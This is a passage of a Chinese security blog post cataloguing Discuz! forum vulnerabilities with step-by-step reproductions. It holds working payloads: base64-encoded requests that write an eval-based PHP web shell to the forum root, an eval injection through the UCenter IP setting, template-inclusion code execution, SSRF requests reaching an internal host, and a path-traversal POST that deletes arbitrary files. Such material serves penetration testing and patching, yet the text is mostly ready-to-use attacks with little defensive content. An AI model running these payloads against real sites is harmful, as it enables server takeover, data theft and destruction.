<p>c.添加图片，选择网络图片，地址{${fputs(fopen(base64_decode(ZGVtby5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}}</p>
<p>d.访问日志，论坛根目录下生成demo.php，一句话密码：c。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/329.html">http://www.freebuf.com/vuls/329.html</a></p>
<h3 id="演示6：Discuz-X3-1后台任意代码执行可拿shell"><a href="#演示6：Discuz-X3-1后台任意代码执行可拿shell" class="headerlink" title="演示6：Discuz! X3.1后台任意代码执行可拿shell"></a>演示6：Discuz! X3.1后台任意代码执行可拿shell</h3><p>全局–〉网站第三方统计代码–〉插入php代码,如插入 &lt;?php phpinfo();?&gt;</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5764594c6c1d33fa895f301cb0737c09.png" class>

<p>工具–〉更新缓存[为了保险起见，更新下系统缓存]：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10295133e9efc1552d01446c06909401.png" class>

<p>门户–&gt; HTML管理–〉设置：1）静态文件扩展名[一定要设置成htm] ：htm<br>2)专题HTML存放目录: template/default/portal 3)设置完，提交吧！</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/083437f5c83273d4fa237839514db0f4.png" class>

<p>门户–〉专题管理–〉创建专题：1）专题标题：xyz 2）静态化名称：portal_topic_222<br>//222为自定义文件名，自己要记住 3）附加内容：选择上：站点尾部信息</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5775ab219249324b0fc04ebb5950145c.png" class>

<p>提交,回到门户–〉专题管理,把刚才创建的专题开启，如下图</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ebfc8b8b2bfc3bc65ba0e44d730d66c4.png" class>

<p>把刚才的专题，生成<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/add9c63ef2233ef0e42538763bc7ba6d.png" class></p>
<p>下面就是关键了，现在到了包含文件的时候了。 再新建一个专题：<br>1）专题标题，静态化名称，这2个随便写<br>2）模板名：这个要选择我们刚才生成的页面：./template/default/portal/portal_topic_222.htm</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f56718e407689f99a980ec93427bb416.png" class>

<p>然后提交，就执行了&lt;?php phpinfo();?&gt;</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5caaa67f9af210b0741facc198cd1b38.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93612">https://www.seebug.org/vuldb/ssvid-93612</a></p>
<h3 id="演示7：Discuz-7-1-7-2-远程代码执行漏洞"><a href="#演示7：Discuz-7-1-7-2-远程代码执行漏洞" class="headerlink" title="演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞"></a>演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞</h3><p>直接GET，利用语句：<br><a target="_blank" rel="noopener" href="http://xxxxx/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb%5D=%7B%5C$%7Bfputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))%7D%7D">http://xxxxx/misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b]={\${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}</a></p>
<p>在根目录生成C.PHP密码是C</p>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="http://blog.51cto.com/simeon/276114">http://blog.51cto.com/simeon/276114</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/hack/26337.html">https://www.jb51.net/hack/26337.html</a></p>
<h3 id="演示8：discuz-7-0-runwizard-inc-php-代码执行漏洞"><a href="#演示8：discuz-7-0-runwizard-inc-php-代码执行漏洞" class="headerlink" title="演示8：discuz 7.0 runwizard.inc.php 代码执行漏洞"></a>演示8：discuz 7.0 runwizard.inc.php 代码执行漏洞</h3><p>在该链接下：<a target="_blank" rel="noopener" href="http://www.80vul.com/bbs/admincp.php?action=runwizard&amp;step=3">http://www.80vul.com/bbs/admincp.php?action=runwizard&amp;step=3</a></p>
<p>发送如下POST请求包。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d039122dcfbf095784f89ed71d9cda9d.png" class>

<p>可获取到webshell</p>
<p><a target="_blank" rel="noopener" href="http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php">http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php</a></p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://blog.51cto.com/simeon/113131">http://blog.51cto.com/simeon/113131</a></p>
<h3 id="演示9：Discuz-X2-5最新版后台管理员权限Getshell"><a href="#演示9：Discuz-X2-5最新版后台管理员权限Getshell" class="headerlink" title="演示9：Discuz!X2.5最新版后台管理员权限Getshell"></a>演示9：Discuz!X2.5最新版后台管理员权限Getshell</h3><p>在后台–&gt;站长–&gt;Ucenter设置处设置UcenterIP为: XX\\‘);eval($_POST[a])?&gt;;//<br>XX</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946befb507f2380f0296e9fb588509b8.png" class>

<p>发现管理页面代码出来了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/11ccd15874dce153f7d432b879907ee4.png" class>

<p>上菜刀：<a target="_blank" rel="noopener" href="http://127.0.0.1/d25/uc_server">http://127.0.0.1/d25/uc_server</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/76a0d8d82f4ccc540d1015819f98adc7.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93655">https://www.seebug.org/vuldb/ssvid-93655</a></p>
<h3 id="演示10：Discuz后台getshell"><a href="#演示10：Discuz后台getshell" class="headerlink" title="演示10：Discuz后台getshell"></a>演示10：Discuz后台getshell</h3><p>后台找到应用，插件</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d5d71fbdc6185df240c12000c439fe3d.png" class>

<p>有一个好贷站长联盟</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/31550f4e59018e1fbba24eec7bb43e9e.png" class>

<p>安装之后有一个导入接口信息</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/74f33d0c31fa5ba3b8dbd3bfde9512b4.png" class>

<p>然后导入接口信息</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8dbe1fcf8edf3af872ec286dbb8e9f07.png" class>

<p>接口信息会放到这里</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/934bf7257cf564eb89c2776934e858ba.png" class>

<p>然后就shell了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/82c59a29c3788973678e4c8d6ec9d66f.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93624">https://www.seebug.org/vuldb/ssvid-93624</a></p>
<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p><strong>漏洞描述：</strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)<br>是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。SSRF<br>形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。可利用来探测内网信息或获取别的网站的信息或钓鱼等。涉及URL如下：</p>
<p><a target="_blank" rel="noopener" href="http://ip/bbs/forum.php?mod=ajax&action=downremoteimg&message=%5Bimg=1,1%5Dhttp://xxxxxxxxxxxxxx.jpg%5B/img%5D&formhash=09cec465">http://ip/bbs/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://xxxxxxxxxxxxxx.jpg[/img]&amp;formhash=09cec465</a></p>
<p><a target="_blank" rel="noopener" href="http://ip/discuz_x3.2_sc_gbk/upload/portal.php">http://ip/discuz_x3.2_sc_gbk/upload/portal.php</a></p>
<p><strong>漏洞场景：</strong>Discuz</p>
<p><strong>漏洞地址：</strong></p>
<p><strong>漏洞级别：</strong>高危</p>
<p>测试步骤与截图：</p>
<h3 id="演示1：SSRF漏洞"><a href="#演示1：SSRF漏洞" class="headerlink" title="演示1：SSRF漏洞"></a>演示1：SSRF漏洞</h3><p>利用前提 ptid==aid且两者必须存在(ptid==帖子id,aid==门户文章id),pid=任意评论id。<br>即论坛门户发表过文章，准备和确认<a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=view&amp;aid=1">http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=view&amp;aid=1</a><br>确认门户中存在发表过的文章,记录下可用的aid</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/c7fdbe9b01886221ed6af7f6294662f2.png" class>

<p>第一步 登陆后,请求获取modauthkey算出的一个key,用于操作对应文章:<br><a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=redirect&amp;goto=findpost&amp;modthreadkey=1&amp;ptid=1&amp;pid=1">http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=redirect&amp;goto=findpost&amp;modthreadkey=1&amp;ptid=1&amp;pid=1</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3655f2c2013bcc964feef6be4b830deb.png" class>

<p>从跳转的链接取出modthreadkey的参数值:<br><a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&amp;tid=1&amp;page=1&amp;modthreadkey=fce8163c9f310147f91a244a9eb9dc33%5C#pid1">http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&amp;tid=1&amp;page=1&amp;modthreadkey=fce8163c9f310147f91a244a9eb9dc33\#pid1</a></p>
<p>第二步 带上当前formhash,modarticlekey拼上第一步的modthreadkey的值,即可发请求:<br>POST:<a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&amp;ac=upload&amp;aid=1&amp;catid=1&amp;op=downremotefile&amp;formhash=760dc9d6&amp;modarticlekey=fce8163c9f310147f91a244a9eb9dc33&amp;content=%5C">http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&amp;ac=upload&amp;aid=1&amp;catid=1&amp;op=downremotefile&amp;formhash=760dc9d6&amp;modarticlekey=fce8163c9f310147f91a244a9eb9dc33&amp;content=\</a><img src="http://internal.zabbix/images/general/zabbix.png\"> aa=a</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3cb02a3ff18c3a978a9d4cef5644181e.png" class>

<p>internal.zabbix域名下的图片被下载并上传到Discuz指定的图片路径下:<br><a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png">http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png</a></p>
<p><a target="_blank" rel="noopener" href="http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg">http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/858590279078a58213d111945ba8800e.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="http://0day5.com/archives/3920/">http://0day5.com/archives/3920/</a></p>
<h3 id="演示2：另一处SSRF漏洞（2-x，3-x）"><a href="#演示2：另一处SSRF漏洞（2-x，3-x）" class="headerlink" title="演示2：另一处SSRF漏洞（2.x，3.x）"></a>演示2：另一处SSRF漏洞（2.x，3.x）</h3><p>访问<a target="_blank" rel="noopener" href="http://xxxx/bbs/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=%5Bimg=1,1%5Dhttp://xxxxxxxxxxxxxx.jpg%5B/img%5D&amp;formhash=09cec465">http://xxxx/bbs/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://xxxxxxxxxxxxxx.jpg[/img]&amp;formhash=09cec465</a></p>
<p>3.x 版本如果请求提示xss拦截要带上 formhash<br>加cookie,之前版本好像不用。SSRF成功后，域名被解析成IP。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3e680cf0afb06099addb160c719dd884.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=151179">https://bugs.shuimugan.com/bug/view?bug_no=151179</a></p>
<h2 id="文件操作类漏洞"><a href="#文件操作类漏洞" class="headerlink" title="文件操作类漏洞"></a>文件操作类漏洞</h2><p><strong>漏洞描述：</strong>由于没有对文件操作类的函数做好限制，导致discuz组件存在文件上传漏洞、任意文件删除漏洞、本地文件包含漏洞。涉及URL如下：</p>
<p>#spacecp模块-&gt;演示1</p>
<p><a target="_blank" rel="noopener" href="http://ip/discuz3_2/home.php?mod=spacecp&amp;ac=profile">http://ip/discuz3_2/home.php?mod=spacecp&amp;ac=profile</a></p>
<p>#管理后台-应用-插件-演示2</p>
<p>测试步骤与截图：</p>
<h3 id="演示1：Discuz-X前台任意文件删除漏洞"><a href="#演示1：Discuz-X前台任意文件删除漏洞" class="headerlink" title="演示1：Discuz!X前台任意文件删除漏洞"></a>演示1：Discuz!X前台任意文件删除漏洞</h3><p>新建importantfile.txt作为测试 进入设置-个人资料，先在页面源代码找到formhash值<br><a target="_blank" rel="noopener" href="http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;ac=profile">http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;ac=profile</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b62795c5be846c3c7036f061739342ec.png" class>

<p>可以看到formhash值是b21b6577。再访问10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;ac=profile&amp;op=base<br>Post数据：birthprovince=../../../importantfile.txt&amp;profilesubmit=1&amp;formhash=b21b6577<br>如图</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3dd60f54cebf35cf2bf8a72a049f7ce4.png" class>

<p>执行后</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1e57cee32d198af9e3c6a28a5955d587.png" class>

<p>出生地被修改成要删除的文件。最后构造表单执行删除文件</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4781de6b2740e55dbd867bb9986cb732.png" class>

<p>随便上传一张图片，即可删除importantfile.txt。</p>
<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/149904.html">http://www.freebuf.com/vuls/149904.html</a></p>
<h3 id="演示2：Discuz-后台第三方插件上传任意后缀文件拿shell（某插件导致）"><a href="#演示2：Discuz-后台第三方插件上传任意后缀文件拿shell（某插件导致）" class="headerlink" title="演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）"></a>演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）</h3><p>问题插件出在：[MZG]点广告赚积分 1.0<br><a target="_blank" rel="noopener" href="http://addon.discuz.com/?@mzg_advertise.plugin">http://addon.discuz.com/?@mzg_advertise.plugin</a> 1.先搜索 “MZG” 找到<br>点广告赚积分。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/28b9ef060ed6856c5e28f2a6d3afda50.png" class>

<p>安装插件，安装GBK还是UFT8随你系统编码选择。安装好插件后，选择 “添加广告”。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/6537467b1c4ad95ad2df969576ecb389.png" class>

<p>添加广告里面的 LOGO<br>文件上传，选本地上传，这里面未限制文件后缀，可以上传任意后缀名文件。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0040a2852de1adfd6c74535d7e88a3d2.png" class>

<p>查看添加的广告，看到了吧？</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5c32e20f2e7bc168defad3174014ff0c.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9d383b898f5ee40aaa646ae31082e72f.png" class>

<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93632">https://www.seebug.org/vuldb/ssvid-93632</a></p>
<h2 id="其他类型漏洞"><a href="#其他类型漏洞" class="headerlink" title="其他类型漏洞"></a>其他类型漏洞</h2><p><strong>漏洞描述：</strong>越权、xxe</p>
<p>Discuz! –X2/X2.5管理权限用户修改创始人用户密码漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93622">https://www.seebug.org/vuldb/ssvid-93622</a></p>
<p>Discuz!3.2 利用UC_KEY登陆任意用户</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-89483">https://www.seebug.org/vuldb/ssvid-89483</a></p>
<p>Discuz! X3.1 逻辑错误漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-89427">https://www.seebug.org/vuldb/ssvid-89427</a></p>
<p>discuz越权回复</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93753">https://www.seebug.org/vuldb/ssvid-93753</a></p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93609">https://www.seebug.org/vuldb/ssvid-93609</a></p>
<p>越权查看照片</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93721">https://www.seebug.org/vuldb/ssvid-93721</a></p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93722">https://www.seebug.org/vuldb/ssvid-93722</a></p>
<p>Discuz! 多个版本HTTP host头攻击漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93728">https://www.seebug.org/vuldb/ssvid-93728</a></p>
<p>Discuz! xxe 可破坏数据库结构，导致脏数据进入</p>
<p><a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=76041">https://bugs.shuimugan.com/bug/view?bug_no=76041</a></p>
<p>Discuz附件下载权限绕过</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93615">https://www.seebug.org/vuldb/ssvid-93615</a></p>
<p>知道key的情况下对ucserver进行注射</p>
<p><a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=65534">https://bugs.shuimugan.com/bug/view?bug_no=65534</a></p>
<p><strong>漏洞场景：</strong>登陆地址中含有session类字段</p>
<p><strong>漏洞地址：</strong></p>
<p><strong>漏洞级别：</strong>高危</p>
<p>测试步骤与截图：</p>
<p>安全修复建议：</p>
<p>每次会话由服务端生成随机的，唯一的，复杂的session。</p>
 
      <!-- reward -->
      
      <div id="reword-out">
        <div id="reward-btn">
          打赏
        </div>
      </div>
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E-CMS%E6%BC%8F%E6%B4%9E-Discuz%E8%AE%BA%E5%9D%9B/" rel="tag">-web漏洞 -CMS漏洞 -Discuz论坛</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            ThinkcmfSQL注入漏洞复现
          
        </div>
      </a>
    
    
      <a href="/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">Spring Boot Actuator未授权访问利用实战利用</div>
      </a>
    
  </nav>

   
<!-- valine评论 -->
<div id="vcomments-box">
  <div id="vcomments"></div>
</div>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
<script>
  new Valine({
    el: "#vcomments",
    app_id: "",
    app_key: "",
    path: window.location.pathname,
    avatar: "monsterid",
    placeholder: "给我的文章加点评论吧~",
    recordIP: true,
  });
  const infoEle = document.querySelector("#vcomments .info");
  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
    infoEle.childNodes.forEach(function (item) {
      item.parentNode.removeChild(item);
    });
  }
</script>
<style>
  #vcomments-box {
    padding: 5px 30px;
  }

  @media screen and (max-width: 800px) {
    #vcomments-box {
      padding: 5px 0px;
    }
  }

  #vcomments-box #vcomments {
    background-color: #fff;
  }

  .v .vlist .vcard .vh {
    padding-right: 20px;
  }

  .v .vlist .vcard {
    padding-left: 10px;
  }
</style>

 
   
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2021
        <i class="ri-heart-fill heart_icon"></i> John Doe
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/haoyun.ico" alt="小透的少年江湖"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
